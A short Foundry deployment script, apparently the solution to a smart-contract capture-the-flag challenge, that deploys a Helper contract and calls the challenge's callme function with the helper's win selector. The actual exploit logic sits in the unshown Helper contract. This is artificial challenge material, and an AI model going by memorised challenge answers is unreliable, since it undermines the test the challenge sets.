// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

import {Challenge} from "src/Challenge.sol";
import {Helper} from "src/Helper.sol";

contract Solve is Script {
    function run() external {
        Challenge challenge = Challenge(vm.envAddress("CHALLENGE_ADDR"));
        vm.startBroadcast();
        challenge.callme(address(new Helper()), Helper.win.selector);
    }
}
